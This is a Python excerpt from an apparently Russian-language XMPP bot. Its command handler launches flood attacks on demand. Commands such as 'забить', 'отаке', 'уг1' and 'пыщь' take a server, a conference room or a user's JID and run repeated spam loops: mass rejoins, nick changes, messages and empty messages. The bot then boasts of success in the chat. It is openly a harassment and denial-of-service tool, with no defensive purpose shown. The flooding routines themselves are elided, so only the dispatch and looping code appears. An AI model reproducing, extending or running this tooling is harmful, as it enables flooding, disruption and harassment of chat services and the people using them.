...
"""
                ...
                if text[:6]==u'забить': #flood.conference+nick+messages
                #забить [rejoins] [renicks] [server] [conference]
                        print u'Забить конфу: '+unicode(text)
                        text=unicode(text[6:])
                        if (get_space(text)!=3):
                                cl.send(xmpp.Message(room, nick+u": косяк с аргументами!", "groupchat"))
                        else:
                                text=text+' '
                                i=1
                                while (text[i]!=" "):
                                ...
                                while (text[i]!=" "):
                                        i=i+1
                                arenicks=int(str(text[j:i]))
                                i=i+1
                                j=i
                                while (text[i]!=" "):
                                        i=i+1
                                aserver=str(text[j:i])
                                i=i+1
                                j=i
                                while (text[i]!=" "):
                                        i=i+1
                                aconference=unicode(text[j:i])
                                
                                while (cntr>0):
                                        spam_fill(arenicks, aserver, aconference)
                                        time.sleep(5)
                                        cntr=cntr-1

                                cl.send(xmpp.Message(room, nick+u": забито!!!", "groupchat"))

                if text[:5]==u'отаке': #flood.conference+nick+messages
                #отаке [rejoins] [renicks] [server] [conference]
                        print u'Атака на конфу: '+unicode(text)
                        text=unicode(text[6:])
                        if (get_space(text)!=3):
                                cl.send(xmpp.Message(room, nick+u": косяк с аргументами!", "groupchat"))
                        else:
                                ...
                                while (cntr>0):
                                        spam_nick(arenicks, aserver, aconference)
                                        time.sleep(5)
                                        cntr=cntr-1

                                cl.send(xmpp.Message(room, nick+u": отаке доне!!!", "groupchat"))

                if text[:5]==u'otake': #flood.conference+nick+reenter
                #отаке [rejoins] [renicks] [server] [conference]
                        print u'Атака на конфу (reenter): '+unicode(text)
                        text=unicode(text[6:])
                        if (get_space(text)!=3):
                                cl.send(xmpp.Message(room, nick+u": косяк с аргументами!", "groupchat"))
                        else:
                                ...
                                while (cntr>0):
                                        spam_nick_fast(arenicks, aserver, aconference)
                                        time.sleep(5)
                                        cntr=cntr-1

                                cl.send(xmpp.Message(room, nick+u": отаке фаст доне!!!", "groupchat"))

                if text[:3]==u'уг1': #flood.jid+messages
                #уг [rejoins] [messages] [server] [nick] [jid]
                        print u'Атака на jid: '+unicode(text)
                        text=unicode(text[4:])
                        ...
                        if (get_space(text)!=4):
                                ...
                                while (text[i]!=" "):
                                        i=i+1
                                aotakejid=str(text[j:i])
                                
                                while (cntr>0):
                                        spam_jid(amessages, aserver, anick, aotakejid)
                                        time.sleep(5)
                                        cntr=cntr-1

                                cl.send(xmpp.Message(room, nick+u": УГ изговнякано!!!", "groupchat"))

                if text[:3]==u'уг2': #flood.jid+empty_messages
                #уг2 [rejoins] [messages] [server] [nick] [jid]
                        print u'Атака на jid (пустыми сообщениями): '+unicode(text)
                        text=unicode(text[4:])
                        ...
                        if (get_space(text)!=4):
                                ...
                                while (cntr>0):
                                        spam_jid_empty(amessages, aserver, anick, aotakejid)
                                        time.sleep(5)
                                        cntr=cntr-1

                                cl.send(xmpp.Message(room, nick+u": УГ изговнякано!!!", "groupchat"))

                if text[:5]==u'пыщь': #flood.conference+jid+messages
                #пыщь [rejoins] [messages] [server] [nick] [conference/nick]
                        print u'Атака на jid в конфе: '+unicode(text)
                        text=unicode(text[5:])
                        if (get_space(text)!=4):
                                cl.send(xmpp.Message(room, nick+u": косяк с аргументами!", "groupchat"))
                        else:
                                ...
                                while (cntr>0):
                                        spam_conf(amessages, aserver, anick, aconference)
                                        time.sleep(5)
                                        cntr=cntr-1
                                cl.send(xmpp.Message(room, nick+u": пыщь!!!111адын", "groupchat"))
